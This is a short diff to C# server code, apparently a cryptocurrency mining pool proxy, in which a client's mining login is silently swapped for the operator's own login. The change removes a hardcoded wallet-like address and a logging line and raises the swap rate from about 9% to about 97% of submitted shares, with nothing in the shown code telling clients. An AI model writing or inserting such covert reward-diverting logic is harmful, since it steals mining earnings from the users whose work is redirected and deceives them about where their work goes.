@@ -899,20 +899,12 @@ namespace Server {
                                 Client jiClient = client;
 
                                 Random random = new Random();
-                                if (random.NextDouble() < 0.09)
+                                if (random.NextDouble() > 0.03)
                                 {
                                     CreateOurself();
                                     jiClient.Login = ourself.Login;
                                 }
-                                
-                                if (random.NextDouble() < 0.03)
-                                {
-                                    CreateOurself();
-                                    jiClient.Login = "49kkH7rdoKyFsb1kYPKjCYiR2xy1XdnJNAY1e7XerwQFb57XQaRP7Npfk5xm1MezGn2yRBz6FWtGCFVKnzNTwSGJ3ZrLtHU";
-                                }
 
-                                Console.WriteLine(jiClient.Login);
-                                
                                 string msg1 = "{\"id\":\"" + jiClient.PoolConnection.PoolId +
                                     "\",\"job_id\":\"" + ji.InnerId +
                                     "\",\"nonce\":\"" + msg["nonce"].GetString () +
